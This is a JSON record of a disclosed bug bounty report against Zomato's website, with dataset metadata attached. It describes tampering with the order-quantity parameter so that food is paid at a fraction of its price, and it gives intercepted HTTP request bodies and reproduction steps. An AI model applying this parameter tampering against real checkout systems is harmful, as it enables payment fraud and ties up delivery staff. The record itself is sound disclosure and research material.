{
    "reported_to": "Zomato",
    "reported_by": "akhil-reni ",
    "title": "[www.zomato.com] Tampering with Order Quantity and paying less amount then actual amount, leads to business loss",
    "content": "\nHi, Team,\nLike discussed with Prateek I am dropping the report here.\nSummary:\nLike the title says using this vulnerability one could order food at negligible price or keep all delivery executives busy.\nDescription:\nWhile fuzzing my way through the payment flow on Zomato orders I came across a couple of interesting bugs that can be escalated to security vulnerabilities.\n\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588This is a Security Issue But when we set a quantity to a decimal number, for example: let's say I am trying to order 1 Biryani that costs 99\u20b9, I can set the quantity to 0.1 and now the order price will total to 9.9\u20b9.\nTo verify the vulnerability I did two orders:\nOne, ordered at the price of 0.1 quantity - Order got cancelled.\n{\u2588\u2588\u2588\u2588\u2588\u2588\u2588}\nTwo, ordered at the price of 0.6 quantity - Order got successfull delivered.\n{\u2588\u2588\u2588\u2588}\n{\u2588\u2588\u2588\u2588}\nBut in both the cases delivery executives were assigned, that basically means that one could spend as low as 10 rupees and keep all zomato executives in my area busy/occupied.\nPlatform(s) Affected: Website (probably mobile too, if it's the same flow)\nBrowsers Verified In [If Applicable]:\nN/A\nSteps To Reproduce:\n\u2588\u2588\u2588\u2588 Select any resturant\n\u2588\u2588\u2588\u2588\u2588\u2588Select any food item from the menu and click continue\n{\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588}\n3) Intercept the HTTP requests, click select net banking\n4) You'll come across the following request, change the quantity to 0.1 (to be on stealth mode, change the quantity to 0.6)\nCode 1.18 KiB\n1POST /php/o2_handler.php HTTP/1.1\n2Host: www.zomato.com\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\n4Accept: application/json\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://www.zomato.com/\n8content-type: application/x-www-form-urlencoded;charset=UTF-8\n9origin: https://www.zomato.com\n10Content-Length: 825\n11Cookie: <redacted>\n12Connection: close\n13\n14\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&order%5Bdishes%5D%5B0%5D%5Btype%5D=dish&order%5Bdishes%5D%5B0%5D%5Bcomment%5D=&order%5Bdishes%5D%5B0%5D%5Bitem_id%5D=481238585&order%5Bdishes%5D%5B0%5D%5Bitem_name%5D=Veg%20Biryani%20%5BRegular%5D&order%5Bdishes%5D%5B0%5D%5Bmrp_item%5D=0&order%5Bdishes%5D%5B0%5D%5Bquantity%5D=1&order%5Bdishes%5D%5B0%5D%5Btags%5D=1&order%5Bdishes%5D%5B0%5D%5Btax_inclusive%5D=0&order%5Bdishes%5D%5B0%5D%5Bunit_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Btotal_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Bis_bogo_active%5D=false&order%5Bdishes%5D%5B0%5D%5BbogoItemsCount%5D=0&order%5Bdishes%5D%5B0%5D%5BalwaysShowOnCheckout%5D=0&order%5Bdishes%5D%5B0%5D%5Bduration_id%5D=0&res_id=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&address_id=\u2588\u2588\u2588\u2588\u2588\u2588&voucher_code=&payment_method_type=&payment_method_id=0&card_bin=&case=calculatecart&csrfToken=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n{\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588}\n5) Click pay and you'll come across the following request. Change the quantity again to 0.1 (or whatever quantity you entered in the previous step)\nCode 1.60 KiB\n1POST /php/o2_handler.php HTTP/1.1\n2Host: www.zomato.com\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0\n4Accept: application/json\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://www.zomato.com/\n8content-type: application/x-www-form-urlencoded;charset=UTF-8\n9origin: https://www.zomato.com\n10Content-Length: 2444\n11Cookie: <redacted>\n12Connection: close\n13\n14case=makeonlineorder&res_id=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&order={\"charges\":[{\"item_name\":\"Delivery Charge\",\"total_cost\":10,\"type\":\"charge\",\"unit_cost\":0,\"quantity\":0,\"comment\":null,\"groups\":[],\"item_id\":0,\"mrp_item\":0,\"tax_inclusive\":0,\"tags\":\"\",\"tax_id\":0,\"id\":96623,\"display_cost\":\"\u00e2\u0082\u00b910\"}],\"taxes\":[{\"item_name\":\"Taxes\",\"total_cost\":0.6,\"type\":\"tax\",\"unit_cost\":0,\"quantity\":0,\"comment\":null,\"groups\":[],\"item_id\":0,\"mrp_item\":0,\"tax_inclusive\":0,\"tags\":\"\",\"tax_id\":0,\"id\":0,\"display_cost\":\"\u00e2\u0082\u00b90.60\"}],\"subtotal2\":[{\"item_name\":\"Subtotal\",\"total_cost\":12,\"type\":\"subtotal2\",\"unit_cost\":0,\"quantity\":0,\"comment\":null,\"groups\":[],\"item_id\":0,\"mrp_item\":0,\"tax_inclusive\":0,\"tags\":\"\",\"tax_id\":0,\"id\":0,\"display_cost\":\"\u00e2\u0082\u00b912.00\"}],\"total\":[{\"item_name\":\"Grand Total\",\"total_cost\":\"22.60\",\"type\":\"total\",\"unit_cost\":0,\"quantity\":0,\"comment\":null,\"groups\":[],\"item_id\":0,\"mrp_item\":0,\"tax_inclusive\":0,\"tags\":\"\",\"tax_id\":0,\"id\":0,\"display_cost\":\"\u00e2\u0082\u00b922.60\"}],\"dishes\":[{\"type\":\"dish\",\"comment\":\"\",\"groups\":[],\"item_id\":481238585,\"item_name\":\"Veg Biryani [Regular]\",\"mrp_item\":0,\"quantity\":0.1,\"tags\":\"1\",\"tax_inclusive\":0,\"unit_cost\":120,\"total_cost\":120,\"is_bogo_active\":false,\"bogoItemsCount\":0,\"alwaysShowOnCheckout\":0,\"duration_id\":0}]}&\u2588\u2588\u2588\u2588\u2588\u2588\n{\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588}\n6) You'll be redirected to payment gateway, pay the amount.\n7) If the restaurant hasn't noticed the quantity then the order will be delivered successfully.\nSupporting Material/References:\nOrder ID - \u2588\u2588\u2588\u2588\u2588\u2588 (which got delivered as POC)\nImpact\nThe impact is:\n1 - Order food for a negligible amount\n2 - Or make indefinite orders at a very low price by setting quantity to 0.02. The orders will go through, and you keep all delivery executives busy this way in one single area. This can be a business risk cause all new orders have to wait until a delivery executive is assigned to them.\nPS: Setting the severity to high, you can give it a right tag once you discuss the worse case scenario internally.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Business Logic Errors"
    ],
    "screenshots": {},
    "disclosed_date": 1537192680,
    "report_url": "https://hackerone.com/reports/403783",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Select any restaurant and food item from the menu on Zomato's website."
        ],
        [
            2,
            "Intercept the HTTP request during payment flow and modify the quantity parameter to a decimal value (e.g., 0.1 or 0.6)."
        ],
        [
            3,
            "Proceed with the payment at the reduced price."
        ],
        [
            4,
            "Observe that the order may be successfully delivered at the manipulated price or occupy delivery executives."
        ]
    ],
    "vuln_description": "The vulnerability allows attackers to manipulate the quantity parameter in the order process to pay significantly less than the actual price of the food item. By setting the quantity to a decimal value (e.g., 0.1), the total order cost is reduced proportionally. This can lead to business losses as attackers can order food at negligible prices or occupy delivery executives with multiple low-cost orders, disrupting service for legitimate customers.",
    "reason": "The attack involves intercepting and modifying HTTP requests, which is a common technique, but the specific manipulation of the quantity parameter to a decimal value is a non-obvious interaction that requires understanding the backend's handling of such inputs. The vulnerability does not require complex application state manipulation or novel logic, making it relatively straightforward once the parameter tampering is identified.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}